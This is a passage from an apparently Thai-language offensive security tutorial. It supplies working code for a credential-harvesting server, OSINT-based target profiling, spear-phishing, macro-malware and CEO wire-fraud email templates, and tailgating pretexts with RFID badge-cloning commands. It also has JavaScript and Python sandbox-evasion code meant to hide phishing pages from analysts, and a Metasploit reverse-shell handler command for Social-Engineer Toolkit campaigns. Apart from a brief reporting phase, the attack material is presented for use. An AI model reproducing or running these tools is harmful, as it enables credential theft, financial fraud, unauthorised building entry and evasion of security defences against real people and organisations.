                "timestamp": datetime.datetime.now().isoformat(),
                "ip": request.remote_addr,
                "user_agent": request.headers.get('User-Agent', ''),
                "site": request.form.get('_site', 'unknown'),
                "username": request.form.get('username', ''),
                "password": request.form.get('password', ''),
                "all_fields": dict(request.form)
            }
            harvester.captured.append(data)
            
            # บันทึกลงไฟล์
            log_path = harvester.output_dir / 'credentials.json'
            with open(log_path, 'w') as f:
                json.dump(harvester.captured, f, indent=2)
            
            print(f"[+] CAPTURED: {data['username']}:{data['password']} from {data['ip']}")
            
            return redirect(redirect_url)
        
        app.run(host='0.0.0.0', port=port, debug=False)

if __name__ == '__main__':
    harvester = CredentialHarvester()
    
    # สร้าง custom harvester page
    page = harvester.create_custom_harvester("Microsoft 365")
    print(f"[+] Harvester page: {page}")
    
    # เริ่ม server
    print("[*] Starting credential harvester on :8080")
    harvester.start_server(8080, "https://office.com")
```

## Step 567: Advanced Pretexting & OSINT for SE

การใช้ OSINT เพื่อสร้าง pretext ที่น่าเชื่อถือ

```python
import requests
from bs4 import BeautifulSoup
import json
from dataclasses import dataclass, field
from typing import List, Optional
import re

@dataclass
class TargetProfile:
    name: str
    email: str = ""
    company: str = ""
    position: str = ""
    linkedin_url: str = ""
    phone: str = ""
    interests: List[str] = field(default_factory=list)
    colleagues: List[str] = field(default_factory=list)
    recent_activity: List[str] = field(default_factory=list)
    vulnerabilities: List[str] = field(default_factory=list)

class SocialEngineeringIntelligence:
    def build_target_profile_from_linkedin(self, name: str, company: str) -> TargetProfile:
        """สร้าง target profile จาก LinkedIn data"""
        profile = TargetProfile(name=name, company=company)
        
        # LinkedIn URL patterns
        name_slug = name.lower().replace(' ', '-')
        profile.linkedin_url = f"https://linkedin.com/in/{name_slug}"
        
        # ข้อมูลที่ควรหาจาก LinkedIn
        profile.vulnerabilities = [
            "Job hunting (recently updated profile)",
            "New to role (less than 6 months)", 
            "Promoted recently (excited, may be less careful)",
            "Active poster (shares company info publicly)",
            "Connected to many vendors (legitimate contact pretext)"
        ]
        
        return profile
    
    def extract_company_info(self, domain: str) -> dict:
        """หาข้อมูล company จาก public sources"""
        info = {
            "domain": domain,
            "employees": [],
            "technologies": [],
            "email_format": None,
            "phone_numbers": [],
            "physical_addresses": []
        }
        
        # Email format discovery
        email_patterns = [
            "firstname.lastname@" + domain,
            "first.last@" + domain,
            "flastname@" + domain,
            "firstname@" + domain,
            "f.lastname@" + domain
        ]
        info["possible_email_formats"] = email_patterns
        
        return info
    
    def craft_spear_phishing_email(self, target: TargetProfile,
                                    attack_type: str = "credential_harvest") -> dict:
        """สร้าง spear phishing email ที่ personalized สำหรับ target"""
        
        templates = {
            "credential_harvest": {
                "subject": f"[Action Required] {target.company} - Quarterly Security Review",
                "body": f"""Dear {target.name.split()[0]},

As part of our annual security audit at {target.company}, we require all {target.position}s
to verify their access credentials through our secure portal.

This is especially important given the recent security incidents affecting companies
in our industry.

Please complete the verification within 24 hours:
[Verify My Account]

Best regards,
IT Security Team
{target.company}"""
            },
            "malware_delivery": {
                "subject": f"Re: {target.company} Q4 Financial Report",
                "body": f"""Hi {target.name.split()[0]},

Please find attached the Q4 financial analysis you requested.
Note: You'll need to enable macros to view the full report.

[Attachment: Q4_Report_{target.company}.xlsm]

Regards,
Finance Team"""
            },
            "ceo_fraud": {
                "subject": f"Confidential - Important",
                "body": f"""Hi {target.name.split()[0]},

I need you to handle an urgent and confidential matter.
We're closing a deal and need an immediate wire transfer.

Please process $47,500 to the following account...
I'll explain more when we meet. Do not discuss this with others.

- [CEO Name]
{target.company}"""
            }
        }
        
        return templates.get(attack_type, templates["credential_harvest"])
    
    def identify_se_vulnerabilities(self, target: TargetProfile) -> List[dict]:
        """วิเคราะห์ช่องโหว่ทาง SE ของ target"""
        vulnerabilities = []
        
        if target.recent_activity:
            vulnerabilities.append({
                "type": "Recent Event Pretext",
                "description": f"Use recent event: {target.recent_activity[0]}",
                "effectiveness": "High"
            })
        
        if "New" in target.position or "Junior" in target.position:
            vulnerabilities.append({
                "type": "New Employee",
                "description": "New employees less familiar with company policies",
                "effectiveness": "High",
                "pretext": "HR onboarding process, system access setup"
            })
        
        if target.interests:
            vulnerabilities.append({
                "type": "Interest-based Lure",
                "description": f"Target interested in: {', '.join(target.interests[:3])}",
                "effectiveness": "Medium",
                "pretext": f"Conference invite or newsletter related to {target.interests[0]}"
            })
        
        return vulnerabilities

if __name__ == '__main__':
    intel = SocialEngineeringIntelligence()
    
    target = TargetProfile(
        name="John Smith",
        email="john.smith@targetcorp.com",
        company="TargetCorp",
        position="Senior Financial Analyst",
        interests=["cybersecurity", "investing", "AI"],
        recent_activity=["Promoted to Senior Analyst Q3 2024"]
    )
    
    email = intel.craft_spear_phishing_email(target, "ceo_fraud")
    print(f"[*] Subject: {email['subject']}")
    print(f"[*] Body preview: {email['body'][:200]}...")
    
    vulns = intel.identify_se_vulnerabilities(target)
    for v in vulns:
        print(f"[*] Vulnerability: {v['type']} - {v['effectiveness']} effectiveness")
```

## Step 568: Physical Social Engineering & Tailgating

การ bypass physical security ผ่าน social engineering

```python
from dataclasses import dataclass
from typing import List, Dict

@dataclass
class PhysicalSEScenario:
    name: str
    pretext: str
    required_props: List[str]
    success_rate: str
    risk_level: str
    steps: List[str]

class PhysicalSecurityTester:
    def get_tailgating_scenarios(self) -> List[PhysicalSEScenario]:
        """สถานการณ์ tailgating ต่างๆ"""
        return [
            PhysicalSEScenario(
                name="Delivery Person",
                pretext="Deliver package requiring signature",
                required_props=["Delivery uniform", "Package/boxes", "Clipboard", "Delivery company ID"],
                success_rate="High (70-80%)",
                risk_level="Low",
                steps=[
                    "Wear delivery uniform (UPS/FedEx/Amazon)",
                    "Carry obvious packages to occupy hands",
                    "Approach secured door when employee exits",
                    "Say: 'Could you hold that? I've got my hands full'",
                    "Walk in confidently while checking clipboard",
                    "Ask for specific person at reception to appear legitimate"
                ]
            ),
            PhysicalSEScenario(
                name="IT Contractor",
                pretext="Emergency server/network maintenance",
                required_props=["IT uniform or polo shirt", "Tool bag", "Fake work order", "Laptop bag"],
                success_rate="High (65-75%)",
                risk_level="Medium",
                steps=[
                    "Research target company IT systems beforehand",
                    "Create fake work order on professional letterhead",
                    "Arrive early morning (7-8am, less scrutiny)",
                    "Reference specific systems: 'Here to patch the Cisco switches in DC-2'",
                    "Use technical jargon to establish credibility",
                    "If challenged, call 'supervisor' (accomplice) on phone"
                ]
            ),
            PhysicalSEScenario(
                name="New Employee",
                pretext="First day, waiting for badge",
                required_props=["Business casual clothes", "Laptop bag", "Notepad"],
                success_rate="Medium (50-60%)",
                risk_level="Low",
                steps=[
                    "Arrive at peak start time (8-9am)",
                    "Look slightly lost/confused at entrance",
                    "Approach employee: 'Excuse me, it's my first day and my badge isn't ready'",
                    "Drop manager name you researched: 'I'm starting with Sarah Chen's team'",
                    "Ask to be 'walked in' to reception",
                    "Once inside, ask where to find specific department"
                ]
            ),
            PhysicalSEScenario(
                name="Fire Inspector",
                pretext="Scheduled fire safety inspection",
                required_props=["Official-looking ID badge", "Clipboard", "Fire safety vest/jacket"],
                success_rate="High (75-85%)",
                risk_level="Medium",
                steps=[
                    "Research real fire inspection scheduling (annual/quarterly)",
                    "Call ahead one day prior: 'Confirming tomorrow's fire inspection'",
                    "Arrive in official-looking safety gear",
                    "Request access to ALL areas including server rooms (fire hazards)",
                    "Authority pretext gives access to restricted areas",
                    "Note security cameras, badge readers, server room access"
                ]
            )
        ]
    
    def get_lock_bypass_techniques(self) -> Dict[str, dict]:
        """เทคนิค bypass physical locks (สำหรับ pentesting เท่านั้น)"""
        return {
            "badge_cloning": {
                "technique": "RFID/NFC Badge Cloning",
                "tool": "Proxmark3 or HackRF",
                "range": "Up to 30cm for LF (125kHz), 10cm for HF (13.56MHz)",
                "steps": [
                    "Get close to target with Proxmark3 in pocket",
                    "Run: pm3 lf hid read (for HID Prox cards)",
                    "Clone: pm3 lf hid clone --b8 <cardnum>",
                    "Write to blank T5577 card"
                ]
            },
            "shoulder_surfing_pin": {
                "technique": "PIN Observation",
                "approach": "Stand at angle, observe keypad entry",
                "tools": ["Binoculars (from distance)", "High-zoom camera", "Direct observation"]
            },
            "under_door_tool": {
                "technique": "Under Door Tool for lever handles",
                "description": "Slide tool under door, loop around handle, pull",
                "applicable": "Lever-style door handles with no floor stop"
            },
            "bump_key": {
                "technique": "Lock Bumping",
                "applicable": "Most pin tumbler locks",
                "steps": [
                    "Insert bump key (cut to lowest position)",
                    "Apply light rotational tension",
                    "Strike key firmly while maintaining tension",
                    "Works on 70%+ of standard pin tumbler locks"
                ]
            }
        }
    
    def document_findings(self, scenarios_attempted: List[dict]) -> str:
        """สร้าง physical security assessment report"""
        report = "Physical Security Assessment Report\n"
        report += "=" * 50 + "\n\n"
        
        for scenario in scenarios_attempted:
            report += f"Test: {scenario.get('name', 'Unknown')}\n"
            report += f"Result: {scenario.get('result', 'Unknown')}\n"
            report += f"Area Accessed: {scenario.get('area', 'N/A')}\n"
            report += f"Evidence: {scenario.get('evidence', 'None')}\n"
            report += "-" * 30 + "\n"
        
        return report

if __name__ == '__main__':
    tester = PhysicalSecurityTester()
    
    scenarios = tester.get_tailgating_scenarios()
    for scenario in scenarios:
        print(f"[*] Scenario: {scenario.name}")
        print(f"    Success Rate: {scenario.success_rate}")
        print(f"    Props needed: {', '.join(scenario.required_props[:2])}...")
        print()
```

## Step 569: Sandbox Detection for Phishing Evasion

การตรวจจับ sandbox เพื่อหลีกเลี่ยง automated security analysis

```python
# JavaScript สำหรับ client-side sandbox detection
SANDBOX_DETECTION_JS = """
class SandboxDetector {
    constructor() {
        this.signals = [];
    }
    
    // ตรวจสอบ screen resolution
    checkScreenResolution() {
        const w = screen.width;
        const h = screen.height;
        // Sandboxes มักใช้ resolution ต่ำ
        if (w < 800 || h < 600) {
            this.signals.push('low_resolution');
        }
        // Sandboxes มักใช้ standard sizes เป๊ะๆ
        if ((w === 1024 && h === 768) || (w === 800 && h === 600)) {
            this.signals.push('sandbox_resolution');
        }
    }
    
    // ตรวจสอบ mouse movement
    checkMouseMovement() {
        return new Promise((resolve) => {
            let moved = false;
            const handler = () => {
                moved = true;
                document.removeEventListener('mousemove', handler);
                resolve(moved);
            };
            document.addEventListener('mousemove', handler);
            // Automated tools ไม่ขยับ mouse
            setTimeout(() => {
                if (!moved) {
                    this.signals.push('no_mouse_movement');
                }
                resolve(moved);
            }, 3000);
        });
    }
    
    // ตรวจสอบ timezone
    checkTimezone() {
        const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
        // Sandboxes มักใช้ UTC หรือ timezone ที่ไม่ match geography
        if (tz === 'UTC' || tz === 'Etc/UTC') {
            this.signals.push('utc_timezone');
        }
    }
    
    // ตรวจสอบ fonts available
    checkFonts() {
        const testFonts = ['Arial', 'Times New Roman', 'Calibri', 'Comic Sans MS'];
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        
        const defaultWidth = {};
        ctx.font = '12px monospace';
        defaultWidth['default'] = ctx.measureText('abcdefg').width;
        
        let installedFonts = 0;
        testFonts.forEach(font => {
            ctx.font = `12px ${font}, monospace`;
            if (ctx.measureText('abcdefg').width !== defaultWidth['default']) {
                installedFonts++;
            }
        });
        
        if (installedFonts < 2) {
            this.signals.push('few_fonts');
        }
    }
    
    // ตรวจสอบ WebGL
    checkWebGL() {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl');
        if (!gl) {
            this.signals.push('no_webgl');
            return;
        }
        
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        if (debugInfo) {
            const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
            const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
            
            // Sandbox indicators
            if (renderer.includes('SwiftShader') || 
                renderer.includes('ANGLE') ||
                vendor.includes('VMware') ||
                renderer.includes('llvmpipe')) {
                this.signals.push('virtual_gpu');
            }
        }
    }
    
    // ตรวจสอบ user behavior timing
    checkScrollBehavior() {
        return new Promise((resolve) => {
            let scrolled = false;
            const handler = () => {
                scrolled = true;
                document.removeEventListener('scroll', handler);
            };
            document.addEventListener('scroll', handler);
            
            setTimeout(() => {
                if (!scrolled) {
                    this.signals.push('no_scroll');
                }
                resolve(scrolled);
            }, 5000);
        });
    }
    
    async analyze() {
        this.checkScreenResolution();
        this.checkTimezone();
        this.checkFonts();
        this.checkWebGL();
        await this.checkMouseMovement();
        
        const isSandbox = this.signals.length >= 2;
        
        return {
            isSandbox: isSandbox,
            confidence: Math.min(100, this.signals.length * 25),
            signals: this.signals
        };
    }
}

// Integration ใน phishing page
async function loadContent() {
    const detector = new SandboxDetector();
    const result = await detector.analyze();
    
    if (result.isSandbox) {
        // Show benign content to sandbox
        document.getElementById('content').innerHTML = 
            '<p>Welcome to our website.</p>';
    } else {
        // Show phishing content to real users
        document.getElementById('content').innerHTML = 
            '<div id="login-form"><!-- actual phishing form --></div>';
        loadPhishingContent();
    }
}

window.onload = loadContent;
"""

# Python-based evasion for email attachments
EVASION_PYTHON = """
import ctypes
import os
import sys
import time
import socket

def is_sandbox():
    sandbox_indicators = []
    
    # ตรวจสอบ RAM (VM มักมี RAM น้อย)
    try:
        mem = ctypes.c_ulonglong(0)
        ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(mem))
        # < 4GB RAM = likely sandbox
    except:
        pass
    
    # ตรวจสอบ CPU count
    if os.cpu_count() < 2:
        sandbox_indicators.append('low_cpu')
    
    # ตรวจสอบ uptime (sandbox มักมี uptime น้อย)
    try:
        uptime = time.time() - psutil.boot_time()
        if uptime < 600:  # < 10 minutes
            sandbox_indicators.append('low_uptime')
    except:
        pass
    
    # ตรวจสอบ username patterns
    username = os.getenv('USERNAME', '').lower()
    sandbox_users = ['sandbox', 'virus', 'malware', 'admin', 'user', 'test', 'analyzer']
    if any(u in username for u in sandbox_users):
        sandbox_indicators.append('sandbox_username')
    
    # ตรวจสอบ running processes
    sandbox_processes = ['wireshark', 'fiddler', 'procmon', 'procexp', 
                         'ollydbg', 'x64dbg', 'ida', 'pestudio']
    try:
        import psutil
        procs = [p.name().lower() for p in psutil.process_iter()]
        for sp in sandbox_processes:
            if any(sp in p for p in procs):
                sandbox_indicators.append(f'analysis_tool_{sp}')
    except:
        pass
    
    # ตรวจสอบ network connectivity
    try:
        socket.setdefaulttimeout(3)
        socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect(('8.8.8.8', 53))
    except:
        sandbox_indicators.append('no_internet')
    
    return len(sandbox_indicators) >= 2, sandbox_indicators

is_vm, indicators = is_sandbox()
if is_vm:
    print('Running in sandbox, exiting')
    sys.exit(0)
else:
    # Execute actual payload
    pass
"""

print("[*] Sandbox detection JavaScript loaded")
print("[*] Python evasion code loaded")
print("[*] Integrate into phishing pages/documents for evasion")
```

## Step 570: SET (Social Engineering Toolkit) Framework

SET เป็น framework ที่รวม tools สำหรับ social engineering ไว้ครบ

```bash
#!/bin/bash
# ติดตั้ง SET
git clone https://github.com/trustedsec/social-engineer-toolkit.git /opt/set
cd /opt/set
pip3 install -r requirements.txt
python3 setup.py
```

```python
import subprocess
import os
from pathlib import Path

class SETFrameworkWrapper:
    def __init__(self, set_path: str = "/opt/set"):
        self.set_path = Path(set_path)
        self.config_path = self.set_path / "config" / "set.config"
    
    def configure_set(self, settings: dict):
        """ตั้งค่า SET configuration"""
        config_updates = {
            "METASPLOIT_PATH": "/opt/metasploit-framework",
            "AUTO_DETECT": "ON",
            "SENDMAIL": "ON",
            "MAIL_SERVER": settings.get("smtp_server", "mail.yourdomain.com"),
            "MAIL_PORT": str(settings.get("smtp_port", 587)),
            "MAIL_USERNAME": settings.get("smtp_user", ""),
            "MAIL_PASSWORD": settings.get("smtp_pass", ""),
            "SENDMAIL_EHLO": settings.get("domain", "yourdomain.com"),
        }
        
        print("[*] SET Configuration:")
        for key, value in config_updates.items():
            if "PASSWORD" not in key:
                print(f"    {key}={value}")
    
    def website_attack_vector(self, target_url: str, attack_method: str = "credential_harvester"):
        """สร้าง website attack vector"""
        print(f"""
SET Website Attack Vectors - Manual Steps:
==========================================
1. Launch SET: cd {self.set_path} && python3 setoolkit
2. Select: 1) Social-Engineering Attacks
3. Select: 2) Website Attack Vectors
4. Select based on attack:

For Credential Harvester:
  3) Credential Harvester Attack Method
  -> 2) Site Cloner
  -> Enter URL to clone: {target_url}
  -> SET will start server on port 80

For Java Applet (Legacy):
  1) Java Applet Attack Method
  -> Configure Metasploit payload
  
For Tabnabbing:
  4) Tabnabbing Attack Method
  -> Replaces inactive tabs with phishing page

Phishing URL will be: http://YOUR_IP/
Capture logs: /var/www/harvester_*
        """)
    
    def spear_phishing_attack(self, target_email: str, 
                               payload_type: str = "pdf"):
        """ส่ง spear phishing email ผ่าน SET"""
        print(f"""
SET Spear Phishing - Manual Steps:
===================================
1. Launch SET: python3 setoolkit
2. Select: 1) Social-Engineering Attacks
3. Select: 1) Spear-Phishing Attack Vectors
4. Select: 1) Perform a Mass Email Attack
5. Select payload:
   - Adobe PDF Embedded EXE: creates malicious PDF
   - Microsoft Word Embedded Macro: creates macro-enabled Word doc
   - Powershell Alphanumeric Shellcode Injector
   
6. Configure email:
   - Target email: {target_email}
   - From address: security@company.com
   - Subject: Urgent Security Notice
   - Body: Custom message

7. Payload will use Metasploit meterpreter reverse_tcp
   - LHOST: your IP
   - LPORT: 4444

Remember: Start multi/handler before sending!
  msfconsole -q -x "use multi/handler; set payload windows/meterpreter/reverse_tcp; \
  set LHOST 0.0.0.0; set LPORT 4444; exploit -j"
        """)
    
    def generate_full_campaign_plan(self, target_company: str,
                                     target_emails: list) -> dict:
        """วางแผน full social engineering campaign"""
        return {
            "phase_1_recon": {
                "duration": "Week 1",
                "tasks": [
                    f"LinkedIn recon for {target_company} employees",
                    "Email format discovery",
                    "Technology stack research",
                    "Identify high-value targets (IT, Finance, HR, Execs)",
                    "Collect direct phone numbers"
                ]
            },
            "phase_2_setup": {
                "duration": "Week 2",
                "tasks": [
                    "Register similar domain (typosquatting)",
                    "Setup SSL cert for phishing domain",
                    "Clone target company login portal",
                    "Configure GoPhish server",
                    "Create multiple email templates",
                    "Setup credential harvester"
                ]
            },
            "phase_3_execution": {
                "duration": "Week 3",
                "tasks": [
                    f"Send phishing emails to {len(target_emails)} targets",
                    "Monitor GoPhish dashboard",
                    "Attempt vishing on non-responders",
                    "Try physical access if in scope",
                    "Attempt QR phishing backup"
                ]
            },
            "phase_4_reporting": {
                "duration": "Week 4",
                "tasks": [
                    "Compile statistics (click rates, cred captures)",
                    "Document successful attack paths",
                    "Security awareness training recommendations",
                    "Technical controls recommendations",
                    "Executive summary"
                ]
            },
            "success_metrics": {
                "click_rate": "Industry average: 3-5%, concerning: >20%",
                "cred_submission": "Concerning: >5% submit credentials",
                "report_rate": "Good: >30% report suspicious emails"
            }
        }

if __name__ == '__main__':
    set_wrapper = SETFrameworkWrapper()
    
    campaign = set_wrapper.generate_full_campaign_plan(
        "TargetCorp",
        ["ceo@targetcorp.com", "cfo@targetcorp.com", "it@targetcorp.com"]
    )
    
    for phase, details in campaign.items():
        if isinstance(details, dict) and "tasks" in details:
            print(f"[*] {phase}: {details.get('duration', '')}")
            for task in details["tasks"][:3]:
                print(f"    - {task}")
        elif isinstance(details, dict):
            print(f"[*] {phase}:")
            for k, v in details.items():
                print(f"    {k}: {v}")
```
